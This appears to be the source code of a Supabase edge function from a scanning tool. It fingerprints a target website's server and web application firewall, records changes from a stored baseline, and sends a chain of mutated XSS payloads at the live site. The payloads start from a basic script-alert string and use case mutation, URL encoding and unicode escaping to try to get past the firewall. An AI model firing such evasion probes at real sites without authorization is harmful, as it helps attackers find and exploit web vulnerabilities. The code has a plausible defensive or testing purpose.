import { corsHeaders } from "https://esm.sh/@supabase/supabase-js@2.95.0/cors";
import { createClient } from "https://esm.sh/@supabase/supabase-js@2.95.0";

interface MutationStep {
  iteration: number;
  payload: string;
  httpStatus: number;
  httpStatusText: string;
  engineAction: string;
  timestamp: string;
  technique: string;
}

async function safeFetch(url: string, opts: RequestInit = {}, ms = 6000): Promise<Response> {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), ms);
  try { return await fetch(url, { ...opts, signal: ctrl.signal }); }
  finally { clearTimeout(timer); }
}

function detectWaf(headers: Headers, body: string): string {
  const h = (k: string) => (headers.get(k) || "").toLowerCase();
  const all = [...headers.entries()].map(([k, v]) => `${k}:${v}`).join("|").toLowerCase();
  if (h("server").includes("cloudflare") || h("cf-ray")) return "Cloudflare WAF";
  if (h("server").includes("sucuri") || all.includes("sucuri")) return "Sucuri";
  if (all.includes("akamai") || h("server").includes("akamaighost")) return "Akamai";
  if (all.includes("incapsula") || all.includes("imperva")) return "Imperva/Incapsula";
  if (all.includes("awselb") || all.includes("x-amz")) return "AWS WAF";
  if (all.includes("x-sucuri")) return "Sucuri";
  if (all.includes("f5-") || all.includes("bigip")) return "F5 BIG-IP";
  if (all.includes("barracuda")) return "Barracuda";
  if (h("server").includes("nginx")) return "ModSecurity (nginx)";
  if (body && /access denied|forbidden by rule/i.test(body)) return "Generic WAF";
  return "Unknown / None";
}

function classifyDrift(prevServer: string, currServer: string, prevWaf: string, currWaf: string): string {
  if (prevServer === "unknown" && prevWaf === "unknown") return "first-baseline";
  if (prevWaf !== currWaf && prevServer !== currServer) return "edge-provider-change";
  if (prevWaf !== currWaf) return "waf-rule-update";
  if (prevServer !== currServer) return "server-version-change";
  return "stable";
}

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });

  try {
    const body = await req.json().catch(() => ({}));
    const targetId: string | undefined = body.targetId;
    let endpoint: string = body.endpoint || "";
    const basePayload = body.payload || "<script>alert(1)</script>";

    const db = createClient(Deno.env.get("SUPABASE_URL")!, Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!);

    // Resolve endpoint from targetId
    if (targetId && !endpoint) {
      const { data: t } = await db.from("target_workspaces").select("domain").eq("id", targetId).single();
      if (t?.domain) endpoint = t.domain.startsWith("http") ? t.domain : `https://${t.domain}`;
    }
    if (!endpoint) endpoint = "https://example.com";

    // ─── Real probe: HEAD/GET the target to fingerprint server + WAF ───
    let currentServer = "unreachable", currentWaf = "Unknown / None";
    let baselineStatus = 0;
    try {
      const resp = await safeFetch(endpoint, { method: "GET", headers: { "User-Agent": "CyberScope-Drift/1.0" } }, 5000);
      baselineStatus = resp.status;
      currentServer = (resp.headers.get("server") || resp.headers.get("x-powered-by") || "unknown").slice(0, 64);
      const sample = await resp.text().catch(() => "");
      currentWaf = detectWaf(resp.headers, sample.slice(0, 2000));
    } catch (e) {
      currentServer = `error: ${(e as Error).message.slice(0, 50)}`;
    }

    // ─── Pull previous baseline from scan_logs metadata ───
    let previousServer = "unknown", previousWaf = "unknown";
    if (targetId) {
      const { data: prevLogs } = await db
        .from("scan_logs")
        .select("metadata, created_at")
        .eq("target_id", targetId)
        .eq("log_type", "info")
        .like("message", "%baseline%")
        .order("created_at", { ascending: false })
        .limit(1);
      const prev = prevLogs?.[0]?.metadata as { server?: string; waf?: string } | undefined;
      if (prev?.server) previousServer = prev.server;
      if (prev?.waf) previousWaf = prev.waf;
    }

    const driftType = classifyDrift(previousServer, currentServer, previousWaf, currentWaf);
    const driftDetected = driftType !== "stable" && driftType !== "first-baseline";

    // ─── Fire mutation chain (real probes against the target) ───
    const techniques = [
      { tech: "raw", payload: basePayload },
      { tech: "case-mutation+url-encode", payload: encodeURIComponent(basePayload.split("").map((c, i) => i % 2 ? c.toUpperCase() : c.toLowerCase()).join("")) },
      { tech: "unicode+fromCharCode+chunked", payload: encodeURIComponent(basePayload.replace(/[a-z]/gi, (c) => `\\u00${c.charCodeAt(0).toString(16).padStart(2, "0")}`)) },
    ];

    const steps: MutationStep[] = [];
    for (let i = 0; i < techniques.length; i++) {
      const { tech, payload } = techniques[i];
      const sep = endpoint.includes("?") ? "&" : "?";
      const probeUrl = `${endpoint}${sep}q=${payload}`;
      let status = 0, statusText = "Network Error";
      try {
        const r = await safeFetch(probeUrl, { method: "GET", headers: { "User-Agent": "CyberScope-Mutator/1.0" } }, 5000);
        status = r.status; statusText = r.statusText || "OK";
        await r.text().catch(() => "");
      } catch {/* keep 0 */}

      let action = "";
      if (status === 0) action = "Network failure — adapting timing strategy.";
      else if (status === 403 || status === 401) action = `Blocked by ${currentWaf} — initializing obfuscation routine.`;
      else if (status === 406 || status === 429) action = "Partial bypass — applying chunked encoding + case mutation.";
      else if (status >= 200 && status < 300) action = "Bypass successful — payload accepted by origin.";
      else if (status >= 500) action = "Backend error triggered — possible vulnerability surface.";
      else action = `Anomalous response — analyzing for further mutation.`;

      steps.push({
        iteration: i + 1,
        payload: payload.slice(0, 200),
        httpStatus: status,
        httpStatusText: statusText.slice(0, 40),
        engineAction: action,
        technique: tech,
        timestamp: new Date().toISOString(),
      });
    }

    // ─── Persist baseline snapshot for next run ───
    if (targetId) {
      await db.from("scan_logs").insert({
        target_id: targetId,
        log_type: "info",
        message: `🛰️ WAF baseline snapshot — server=${currentServer}, waf=${currentWaf}${driftDetected ? ` ⚠️ DRIFT (${driftType})` : ""}`,
        metadata: { server: currentServer, waf: currentWaf, baselineStatus, driftType, mutationChain: steps },
      });
    }

    const driftReport = {
      endpoint, previousServer, currentServer, previousWaf, currentWaf,
      driftDetected, driftType, detectedAt: new Date().toISOString(),
    };

    return new Response(
      JSON.stringify({ ok: true, drift: driftReport, mutationChain: steps }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" }, status: 200 }
    );
  } catch (err) {
    return new Response(
      JSON.stringify({ ok: false, error: (err as Error).message }),
      { headers: { ...corsHeaders, "Content-Type": "application/json" }, status: 200 }
    );
  }
});
